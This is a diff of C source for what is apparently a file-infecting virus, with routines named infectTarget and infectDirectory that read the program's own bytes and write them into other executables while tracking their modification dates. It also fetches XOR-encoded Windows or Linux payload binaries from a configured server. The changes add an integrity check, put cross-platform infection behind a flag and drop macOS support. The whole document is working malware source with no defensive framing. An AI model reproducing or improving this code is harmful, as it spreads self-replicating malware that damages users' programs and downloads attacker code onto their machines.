@@ -1,27 +1,16 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <time.h>
-#include "settings.h"
+#include "common.h"
 #include "os.h"
 #include "web.h"
 #include "clonelib.h"
 #include "thirdparty/b64.h"
-#ifndef INT32_MAX
-	#define INT32_MAX 2147483647
-#endif
 
-void getTempDir(char** tempdir){
-	#if defined(_WIN32)
-		strcpy(*tempdir,getenv("TEMP"));
-	#else
-		strcpy(*tempdir,getenv("TMPDIR"));
-	#endif
-}
 
 unsigned int getRemoteBytes(char** decrypted_msg, const char* url){
 	//get encoded message
-	char* encoded_msg=getHTML(url);
+	char* encoded_msg=getHypertext(url);
 	
 	//Decode message
 	char* decoded_msg;
@@ -42,12 +31,16 @@ unsigned int getRemoteBytes(char** decrypted_msg, const char* url){
 		}
 	}
 
+	//Perform one-byte Integrity check
+	if (*decrypted_msg[raw_msg_size-XOR_KEY_SIZE-1]!=(*decrypted_msg[0] ^ *decrypted_msg[raw_msg_size-XOR_KEY_SIZE-2]))
+		fprintf(stderr,"Error: getRemoteBytes: integrity check failed\n");
+	
 	//Deallocate memory
 	free(decoded_msg);
 	
 	
 	
-	return raw_msg_size-XOR_KEY_SIZE;
+	return raw_msg_size-XOR_KEY_SIZE-1;
 }
 unsigned int getOwnBytes(char** bytes, const char* arg0){	
 	//Get name of executable
@@ -88,7 +81,7 @@ unsigned int getOwnBytes(char** bytes, const char* arg0){
 }
 
 
-bool infectTarget(const char* target, char* malcode, unsigned int malsize){
+bool infectTarget(const char* target, const char* malcode, unsigned int malsize){
 	
 	//Get target modify date
 	int64_t tardate=getFileModifiedDate(target);
@@ -161,7 +154,7 @@ bool infectDirectory(const char* path, const char* arg0){
 						printf("%d",infectTarget(ls[i],bytes,bytes_size));
 						free(bytes);
 						
-					}else{
+					}else if(CROSS_PLATFORM_ON){
 						char* remote_url=(char*)malloc(sizeof(char)*strlen(SERVER_HOSTNAME XBIN_WIN64));
 						if(exectype->is_win){
 							//Get windows binary
@@ -173,10 +166,6 @@ bool infectDirectory(const char* path, const char* arg0){
 							printf("(elf)");
 							strcpy(remote_url,SERVER_HOSTNAME XBIN_ELF64);
 							
-						}else if(exectype->is_macho){
-							//Get OSX binary
-							printf("(mach-o)");
-							strcpy(remote_url,SERVER_HOSTNAME XBIN_MAC64);
 						}else{
 							printf("Error(clonelib.c) - No platform\n");
 							return false;
